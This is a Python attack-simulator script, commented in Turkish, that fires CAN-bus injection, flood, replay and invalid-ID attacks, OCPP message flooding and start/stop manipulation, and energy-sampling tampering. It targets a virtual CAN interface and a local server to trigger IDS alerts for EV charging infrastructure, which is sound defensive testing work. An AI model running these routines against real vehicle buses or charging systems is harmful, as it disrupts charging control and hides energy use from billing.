"""
Attack Simulator - Saldırı Senaryolarını Simüle Eder
Dashboard'da kırmızı alarm tetiklemek için kullanılır.
"""
import can
import time
import random
import argparse
import asyncio
import websockets
import json
from typing import List, Dict
from loguru import logger
from utils.can_handler import CANBusHandler, CANFrame


class AttackSimulator:
    """
    Çeşitli saldırı senaryolarını simüle eder.
    
    Saldırı Tipleri:
    1. Unauthorized CAN Injection
    2. CAN Flood Attack
    3. Replay Attack
    4. Invalid CAN ID Attack
    5. Spoofed OCPP Command
    """
    
    def __init__(self, interface: str = "vcan0"):
        self.interface = interface
        self.can_handler = CANBusHandler(interface=interface)
        
        logger.info(f"AttackSimulator başlatıldı: {interface}")
    
    def connect(self) -> bool:
        """CAN-Bus'a bağlan"""
        return self.can_handler.connect()
    
    def disconnect(self) -> None:
        """Bağlantıyı kes"""
        self.can_handler.disconnect()
    
    # Saldırı 1: Unauthorized CAN Injection
    def unauthorized_injection(self, can_id: int = 0x200, count: int = 1):
        """
        Bridge tarafından gönderilmemiş sahte CAN frame gönder.
        IDS bu frame'i "UNAUTHORIZED_CAN_INJECTION" olarak algılamalı.
        
        Args:
            can_id: Hedef CAN ID
            count: Kaç frame gönderileceği
        """
        logger.warning(f"🚨 SALDIRI: Unauthorized CAN Injection başlatılıyor...")
        logger.info(f"   CAN ID: {hex(can_id)}, Frame sayısı: {count}")
        
        for i in range(count):
            # Sahte payload
            data = [0xFF, 0xFF, 0xFF, 0xFF, 0xDE, 0xAD, 0xBE, 0xEF]
            
            frame = CANFrame(
                can_id=can_id,
                data=data,
                dlc=len(data),
                timestamp=time.time()
            )
            
            success = self.can_handler.send_frame(frame)
            if success:
                logger.debug(f"  [{i+1}/{count}] Sahte frame gönderildi")
            
            time.sleep(0.1)
        
        logger.warning(f"✓ Unauthorized Injection tamamlandı ({count} frame)")
    
    # Saldırı 2: CAN Flood Attack
    def can_flood(self, can_id: int = 0x201, duration: float = 2.0, rate: int = 200):
        """
        Çok kısa sürede çok fazla CAN frame gönder (DoS).
        IDS "CAN_FLOOD_ATTACK" algılamalı.
        
        Args:
            can_id: Hedef CAN ID
            duration: Saldırı süresi (saniye)
            rate: Frame/saniye
        """
        logger.warning(f"🚨 SALDIRI: CAN Flood başlatılıyor...")
        logger.info(f"   CAN ID: {hex(can_id)}, Süre: {duration}s, Rate: {rate} frame/s")
        
        start_time = time.time()
        frame_count = 0
        
        while time.time() - start_time < duration:
            data = [random.randint(0, 255) for _ in range(8)]
            
            frame = CANFrame(
                can_id=can_id,
                data=data,
                dlc=8,
                timestamp=time.time()
            )
            
            self.can_handler.send_frame(frame)
            frame_count += 1
            
            # Rate limiting
            time.sleep(1.0 / rate)
        
        logger.warning(f"✓ CAN Flood tamamlandı ({frame_count} frame {duration}s içinde)")
    
    # Saldırı 3: Replay Attack
    def replay_attack(self, can_id: int = 0x200, original_data: List[int] = None, 
                     delay: float = 1.0, replay_count: int = 3):
        """
        Aynı CAN frame'i kısa aralıklarla tekrar gönder.
        IDS "REPLAY_ATTACK" algılamalı.
        
        Args:
            can_id: Hedef CAN ID
            original_data: Orijinal frame data
            delay: Replay'ler arası gecikme
            replay_count: Kaç kez replay edileceği
        """
        if not original_data:
            original_data = [0x01, 0x01, 0xAB, 0xCD, 0x00, 0x00, 0x00, 0x00]
        
        logger.warning(f"🚨 SALDIRI: Replay Attack başlatılıyor...")
        logger.info(f"   CAN ID: {hex(can_id)}, Replay sayısı: {replay_count}, Gecikme: {delay}s")
        
        for i in range(replay_count):
            frame = CANFrame(
                can_id=can_id,
                data=original_data,
                dlc=len(original_data),
                timestamp=time.time()
            )
            
            self.can_handler.send_frame(frame)
            logger.debug(f"  [{i+1}/{replay_count}] Frame replay edildi")
            
            if i < replay_count - 1:
                time.sleep(delay)
        
        logger.warning(f"✓ Replay Attack tamamlandı")
    
    # Saldırı 4: Invalid CAN ID Attack
    def invalid_can_id(self, invalid_id: int = 0x9FF, count: int = 5):
        """
        İzin listesinde olmayan CAN ID ile frame gönder.
        IDS "INVALID_CAN_ID" algılamalı.
        
        Args:
            invalid_id: Geçersiz CAN ID (whitelist dışı)
            count: Frame sayısı
        """
        logger.warning(f"🚨 SALDIRI: Invalid CAN ID başlatılıyor...")
        logger.info(f"   CAN ID: {hex(invalid_id)}, Frame sayısı: {count}")
        
        for i in range(count):
            data = [0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
            
            frame = CANFrame(
                can_id=invalid_id,
                data=data,
                dlc=8,
                timestamp=time.time()
            )
            
            self.can_handler.send_frame(frame)
            logger.debug(f"  [{i+1}/{count}] Geçersiz ID ile frame gönderildi")
            
            time.sleep(0.1)
        
        logger.warning(f"✓ Invalid CAN ID Attack tamamlandı")
    
    # Saldırı 5: High Entropy Attack (ML tespit etmeli)
    def high_entropy_attack(self, can_id: int = 0x200, count: int = 10):
        """
        Tamamen rastgele payload ile frame gönder.
        ML-IDS yüksek entropy'yi anomali olarak algılamalı.
        
        Args:
            can_id: Hedef CAN ID
            count: Frame sayısı
        """
        logger.warning(f"🚨 SALDIRI: High Entropy Attack başlatılıyor...")
        logger.info(f"   CAN ID: {hex(can_id)}, Frame sayısı: {count}")
        
        for i in range(count):
            # Tamamen rastgele data (yüksek entropy)
            data = [random.randint(0, 255) for _ in range(8)]
            
            frame = CANFrame(
                can_id=can_id,
                data=data,
                dlc=8,
                timestamp=time.time()
            )
            
            self.can_handler.send_frame(frame)
            logger.debug(f"  [{i+1}/{count}] Yüksek entropy frame gönderildi")
            
            time.sleep(0.2)
        
        logger.warning(f"✓ High Entropy Attack tamamlandı")
    
    # Saldırı 6: MitM OCPP Manipulation (Senaryo #1)
    def mitm_ocpp_manipulation(self, scenario: str = "start_to_stop"):
        """
        Man-in-the-Middle OCPP mesaj manipülasyonu simülasyonu.
        
        OCPP mesajlarının CAN karşılıklarını değiştirerek, CP'nin
        yanlış CAN frame göndermesine sebep olur.
        
        Senaryolar:
        - "start_to_stop": RemoteStartTransaction → RemoteStopTransaction
        - "stop_to_start": RemoteStopTransaction → RemoteStartTransaction
        - "timing_anomaly": Normal Start sonrası hemen Stop
        
        Args:
            scenario: Saldırı senaryosu tipi
        """
        logger.warning(f"🚨 SALDIRI: MitM OCPP Manipulation başlatılıyor...")
        logger.info(f"   Senaryo: {scenario}")
        logger.info(f"   Hedef: OCPP→CAN mapping manipülasyonu")
        
        if scenario == "start_to_stop":
            logger.info("   [Simülasyon] RemoteStartTransaction komutu yakalandı")
            time.sleep(0.5)
            
            # Saldırgan, Start komutunu Stop'a çevirir
            logger.warning("   [Manipülasyon] Start → Stop dönüştürülüyor")
            time.sleep(0.3)
            
            # CP'ye manipüle edilmiş mesaj gelir, Stop CAN frame'i gönderir
            logger.info("   [CP Action] RemoteStopTransaction olarak işleniyor")
            
            # Beklenen: 0x200 (Start), Gerçekleşen: 0x201 (Stop)
            wrong_frame = CANFrame(
                can_id=0x201,  # Stop CAN ID
                data=[0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
                dlc=8,
                timestamp=time.time()
            )
            
            self.can_handler.send_frame(wrong_frame)
            logger.error("   ⚠️  OCPP-CAN Mismatch: Start bekleniyor ama Stop frame gönderildi!")
            logger.info("   [IDS] K3 kuralı tetiklenmeli: OCPP_CAN_MISMATCH")
        
        elif scenario == "stop_to_start":
            logger.info("   [Simülasyon] RemoteStopTransaction komutu yakalandı")
            time.sleep(0.5)
            
            logger.warning("   [Manipülasyon] Stop → Start dönüştürülüyor")
            time.sleep(0.3)
            
            # Beklenen: 0x201 (Stop), Gerçekleşen: 0x200 (Start)
            wrong_frame = CANFrame(
                can_id=0x200,  # Start CAN ID
                data=[0x01, 0x01, 0xAB, 0xCD, 0x00, 0x00, 0x00, 0x00],
                dlc=8,
                timestamp=time.time()
            )
            
            self.can_handler.send_frame(wrong_frame)
            logger.error("   ⚠️  OCPP-CAN Mismatch: Stop bekleniyor ama Start frame gönderildi!")
        
        elif scenario == "timing_anomaly":
            logger.info("   [Simülasyon] Normal RemoteStartTransaction")
            
            # İlk olarak normal Start frame
            start_frame = CANFrame(
                can_id=0x200,
                data=[0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
                dlc=8,
                timestamp=time.time()
            )
            self.can_handler.send_frame(start_frame)
            logger.info("   [Normal] Start CAN frame gönderildi")
            
            # 1 saniye sonra aniden Stop (K1 kuralı: <2 saniye)
            time.sleep(1.0)
            logger.warning("   [Manipülasyon] 1 saniye sonra Stop komutu enjekte ediliyor")
            
            stop_frame = CANFrame(
                can_id=0x201,
                data=[0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
                dlc=8,
                timestamp=time.time()
            )
            self.can_handler.send_frame(stop_frame)
            logger.error("   ⚠️  Timing Anomaly: Start sonrası 1 saniyede Stop!")
            logger.info("   [IDS] K1 kuralı tetiklenmeli: TIMING_MISMATCH")
        
        else:
            logger.error(f"   Bilinmeyen senaryo: {scenario}")
            return
        
        logger.warning(f"✓ MitM OCPP Manipulation tamamlandı")
        logger.info("")
        logger.info("Beklenen IDS Alerts:")
        logger.info("  - OCPP_CAN_MISMATCH (K3)")
        logger.info("  - TIMING_ANOMALY (K1)")
    
    # Saldırı 7: OCPP Message Flooding (Senaryo #2)
    async def ocpp_message_flooding_async(
        self, 
        csms_url: str = "ws://localhost:9000",
        rate: int = 20,  # mesaj/saniye (eşik 5, bu onu aşar)
        duration: float = 5.0,
        message_type: str = "Heartbeat"
    ):
        """
        OCPP mesaj yoğunluğu saldırısı (DoS hazırlığı).
        CSMS'e normalin çok üzerinde mesaj göndererek kaynakları tüketir.
        
        Args:
            csms_url: CSMS WebSocket URL'i
            rate: Mesaj/saniye
            duration: Saldırı süresi
            message_type: OCPP mesaj tipi (Heartbeat, StatusNotification vb.)
        """
        logger.warning(f"🚨 SALDIRI: OCPP Message Flooding başlatılıyor...")
        logger.info(f"   Hedef CSMS: {csms_url}")
        logger.info(f"   Rate: {rate} mesaj/saniye (Eşik: 5 mesaj/s)")
        logger.info(f"   Süre: {duration} saniye")
        logger.info(f"   Mesaj Tipi: {message_type}")
        
        message_count = 0
        start_time = time.time()
        
        try:
            async with websockets.connect(csms_url, subprotocols=['ocpp1.6']) as ws:
                logger.info("   ✓ CSMS'e bağlandı")
                
                while time.time() - start_time < duration:
                    # OCPP mesajı oluştur
                    if message_type == "Heartbeat":
                        msg = [
                            2,  # CALL
                            f"flood-{message_count}",
                            "Heartbeat",
                            {}
                        ]
                    elif message_type == "StatusNotification":
                        msg = [
                            2,
                            f"flood-{message_count}",
                            "StatusNotification",
                            {
                                "connectorId": 1,
                                "errorCode": "NoError",
                                "status": "Available"
                            }
                        ]
                    elif message_type == "BootNotification":
                        msg = [
                            2,
                            f"flood-{message_count}",
                            "BootNotification",
                            {
                                "chargePointVendor": "AttackerVendor",
                                "chargePointModel": "FloodBot"
                            }
                        ]
                    else:
                        msg = [2, f"flood-{message_count}", message_type, {}]
                    
                    # Mesajı gönder
                    await ws.send(json.dumps(msg))
                    message_count += 1
                    
                    if message_count % 10 == 0:
                        logger.debug(f"   [{message_count}] mesaj gönderildi...")
                    
                    # Rate limiting
                    await asyncio.sleep(1.0 / rate)
                
                logger.warning(f"✓ OCPP Flooding tamamlandı: {message_count} mesaj {duration:.1f}s içinde")
                logger.info(f"   Ortalama: {message_count/duration:.1f} mesaj/saniye")
                logger.info("")
                logger.info("Beklenen IDS Alert:")
                logger.info("  - OCPP_RATE_LIMIT_EXCEEDED (Senaryo #2)")
        
        except Exception as e:
            logger.error(f"   Flooding sırasında hata: {e}")
            logger.info(f"   ({message_count} mesaj gönderildi)")
    
    def ocpp_message_flooding(self, **kwargs):
        """
        Sync wrapper for OCPP flooding attack.
        """
        asyncio.run(self.ocpp_message_flooding_async(**kwargs))
        logger.info("  - Severity: CRITICAL")
        logger.info("  - Dashboard: Kırmızı alarm görünmeli")
    
    # Saldırı 8: Adaptive Sampling Manipulation (Senaryo #3)
    def sampling_manipulation(
        self,
        scenario: str = "rate_drop",
        duration: float = 120.0
    ):
        """
        Adaptif örnekleme manipülasyonu (Senaryo #3).
        Enerji ölçüm örnekleme oranını düşürür veya peak değerleri gizler.
        
        Senaryolar:
        - "rate_drop": Örnekleme oranını 1s → 60s düşür
        - "peak_smoothing": Yüksek değerleri ortala ve gizle
        - "buffer_manipulation": Ham veriyi buffer'da tut, gönderme
        
        Args:
            scenario: Saldırı senaryosu
            duration: Saldırı süresi (saniye)
        """
        logger.warning(f"🚨 SALDIRI: Sampling Manipulation başlatılıyor...")
        logger.info(f"   Senaryo: {scenario}")
        logger.info(f"   Süre: {duration} saniye")
        
        if scenario == "rate_drop":
            logger.info("   [Simülasyon] Normal örnekleme: 1 sample/saniye")
            logger.info("   [Manipülasyon] Örnekleme oranı düşürülüyor → 1 sample/60 saniye")
            
            start_time = time.time()
            sample_count = 0
            
            # Normal: Her saniye ölçüm
            # Manipülasyon: Her 60 saniyede bir ölçüm
            manipulated_interval = 60.0  # saniye
            
            while time.time() - start_time < duration:
                # Sahte enerji değeri (kWh)
                energy_value = 10.5 + random.uniform(-0.5, 0.5)
                
                logger.debug(f"   [Sample {sample_count}] Energy: {energy_value:.2f} kWh")
                sample_count += 1
                
                # Düşük örnekleme oranı
                time.sleep(manipulated_interval)
            
            samples_per_minute = sample_count / (duration / 60.0)
            logger.warning(f"✓ Rate Drop tamamlandı: {sample_count} sample, {samples_per_minute:.1f} sample/min")
            logger.info("   Beklenen IDS Alert: SAMPLING_RATE_DROP")
        
        elif scenario == "peak_smoothing":
            logger.info("   [Simülasyon] Yüksek güç tüketimi oluşturuluyor")
            logger.info("   [Manipülasyon] Peak değerler ortalama alınarak gizleniyor")
            
            start_time = time.time()
            sample_count = 0
            buffer = []
            
            while time.time() - start_time < duration:
                # Gerçek değer: Yüksek varyans (7-15 kW arası)
                real_power = random.uniform(7.0, 15.0)
                buffer.append(real_power)
                
                # Her 10 sample'da bir ortalama al ve gönder
                if len(buffer) >= 10:
                    # Manipülasyon: Ortalama gönder (peak'leri gizler)
                    averaged_power = sum(buffer) / len(buffer)
                    
                    logger.debug(f"   [Real] Peak: {max(buffer):.2f} kW | [Sent] Avg: {averaged_power:.2f} kW")
                    logger.debug(f"   [Hidden] {max(buffer) - averaged_power:.2f} kW peak kaybı")
                    
                    buffer.clear()
                    sample_count += 1
                
                time.sleep(1.0)
            
            logger.warning(f"✓ Peak Smoothing tamamlandı: {sample_count} averaged samples")
            logger.info("   Beklenen IDS Alert: ENERGY_VARIANCE_DROP")
            logger.info("   Etki: Yüksek tüketim faturalamaya yansımadı")
        
        elif scenario == "buffer_manipulation":
            logger.info("   [Simülasyon] Ham veri toplanıyor")
            logger.info("   [Manipülasyon] Veri buffer'da tutuluyor, sunucuya gönderilmiyor")
            
            start_time = time.time()
            raw_buffer_size = 0
            sent_count = 0
            
            while time.time() - start_time < duration:
                # Her saniye 1 ham ölçüm oluştur
                raw_buffer_size += 1
                
                # Her 30 saniyede sadece 1 ölçüm gönder
                if raw_buffer_size % 30 == 0:
                    energy_value = 10.0 + random.uniform(-2.0, 2.0)
                    sent_count += 1
                    
                    ratio = raw_buffer_size / sent_count
                    logger.debug(f"   [Buffer] {raw_buffer_size} raw | [Sent] {sent_count} | Ratio: {ratio:.1f}x")
                
                time.sleep(1.0)
            
            final_ratio = raw_buffer_size / sent_count if sent_count > 0 else 0
            logger.warning(f"✓ Buffer Manipulation tamamlandı")
            logger.info(f"   Raw buffer: {raw_buffer_size} samples")
            logger.info(f"   Sent: {sent_count} samples")
            logger.info(f"   Ratio: {final_ratio:.1f}x (eşik: 2.0x)")
            logger.info("   Beklenen IDS Alert: BUFFER_MANIPULATION")
        
        else:
            logger.error(f"   Bilinmeyen senaryo: {scenario}")
            return
        
        logger.warning(f"✓ Sampling Manipulation tamamlandı")
        logger.info("")
        logger.info("Beklenen Etkiler:")
        logger.info("  - Eksik ücretlendirme (gelir kaybı)")
        logger.info("  - Yanlış kapasite planlama")
        logger.info("  - Peak algılama sistemi bypass")
    
    # Kombine saldırı
    def combined_attack(self):
        """
        Birden fazla saldırı tipini peş peşe uygular.
        Dashboard'da birden fazla farklı alert'in görünmesini sağlar.
        """
        logger.warning("🚨 KOMBİNE SALDIRI BAŞLATILIYOR!")
        logger.info("=" * 60)
        
        time.sleep(2)
        
        # 1. Unauthorized Injection
        self.unauthorized_injection(can_id=0x200, count=3)
        time.sleep(3)
        
        # 2. Invalid CAN ID
        self.invalid_can_id(invalid_id=0x9FF, count=3)
        time.sleep(3)
        
        # 3. Replay Attack
        self.replay_attack(can_id=0x201, delay=1.0, replay_count=3)
        time.sleep(3)
        
        # 4. High Entropy (ML için)
        self.high_entropy_attack(can_id=0x200, count=5)
        time.sleep(3)
        
        # 5. CAN Flood (son darbe)
        self.can_flood(can_id=0x202, duration=1.0, rate=150)
        
        logger.warning("=" * 60)
        logger.warning("✓ KOMBİNE SALDIRI TAMAMLANDI!")


def main():
    """CLI interface"""
    parser = argparse.ArgumentParser(description="CAN-Bus Attack Simulator")
    parser.add_argument(
        "--interface",
        type=str,
        default="vcan0",
        help="CAN interface (default: vcan0)"
    )
    parser.add_argument(
        "--attack",
        type=str,
        choices=["injection", "flood", "replay", "invalid_id", "entropy", "mitm", "ocpp_flood", "sampling", "combined", "all"],
        default="combined",
        help="Saldırı tipi"
    )
    parser.add_argument(
        "--mitm-scenario",
        type=str,
        choices=["start_to_stop", "stop_to_start", "timing_anomaly"],
        default="start_to_stop",
        help="MitM saldırı senaryosu (sadece --attack mitm ile kullanılır)"
    )
    parser.add_argument(
        "--csms-url",
        type=str,
        default="ws://localhost:9000",
        help="CSMS WebSocket URL (OCPP flooding için)"
    )
    parser.add_argument(
        "--ocpp-rate",
        type=int,
        default=20,
        help="OCPP mesaj rate (mesaj/saniye) - Senaryo #2"
    )
    parser.add_argument(
        "--ocpp-duration",
        type=float,
        default=5.0,
        help="OCPP flooding süresi (saniye) - Senaryo #2"
    )
    parser.add_argument(
        "--sampling-scenario",
        type=str,
        choices=["rate_drop", "peak_smoothing", "buffer_manipulation"],
        default="rate_drop",
        help="Sampling manipulation senaryosu - Senaryo #3"
    )
    parser.add_argument(
        "--sampling-duration",
        type=float,
        default=120.0,
        help="Sampling manipulation süresi (saniye) - Senaryo #3"
    )
    
    args = parser.parse_args()
    
    # Logger config
    logger.remove()
    logger.add(
        lambda msg: print(msg, end=""),
        colorize=True,
        format="<green>{time:HH:mm:ss}</green> | <level>{level:8}</level> | <level>{message}</level>"
    )
    
    # Simulator başlat
    simulator = AttackSimulator(interface=args.interface)
    
    if not simulator.connect():
        logger.error(f"CAN interface bağlantısı başarısız: {args.interface}")
        logger.info("vcan0 kurulumu:")
        logger.info("  sudo modprobe vcan")
        logger.info("  sudo ip link add dev vcan0 type vcan")
        logger.info("  sudo ip link set up vcan0")
        return
    
    try:
        logger.info(f"Saldırı tipi: {args.attack}")
        logger.info("=" * 60)
        
        if args.attack == "injection":
            simulator.unauthorized_injection(count=5)
        
        elif args.attack == "flood":
            simulator.can_flood(duration=3.0, rate=200)
        
        elif args.attack == "replay":
            simulator.replay_attack(replay_count=5, delay=1.0)
        
        elif args.attack == "invalid_id":
            simulator.invalid_can_id(invalid_id=0x9FF, count=10)
        
        elif args.attack == "entropy":
            simulator.high_entropy_attack(count=15)
        
        elif args.attack == "mitm":
            simulator.mitm_ocpp_manipulation(scenario=args.mitm_scenario)
        
        elif args.attack == "ocpp_flood":
            simulator.ocpp_message_flooding(
                csms_url=args.csms_url,
                rate=args.ocpp_rate,
                duration=args.ocpp_duration
            )
        
        elif args.attack == "sampling":
            simulator.sampling_manipulation(
                scenario=args.sampling_scenario,
                duration=args.sampling_duration
            )
        
        elif args.attack == "combined":
            simulator.combined_attack()
        
        elif args.attack == "all":
            logger.info("TÜM SALDIRILAR SIRAYLA ÇALIŞTIRILACAK...")
            time.sleep(2)
            
            simulator.unauthorized_injection(count=3)
            time.sleep(5)
            
            simulator.invalid_can_id(count=3)
            time.sleep(5)
            
            simulator.replay_attack(replay_count=3)
            time.sleep(5)
            
            simulator.high_entropy_attack(count=5)
            time.sleep(5)
            
            simulator.mitm_ocpp_manipulation(scenario="timing_anomaly")
            time.sleep(5)
            
            simulator.can_flood(duration=2.0, rate=150)
    
    except KeyboardInterrupt:
        logger.warning("\n⚠ Saldırı durduruldu (Ctrl+C)")
    
    finally:
        simulator.disconnect()
        logger.info("Simulator kapatıldı")


if __name__ == "__main__":
    main()

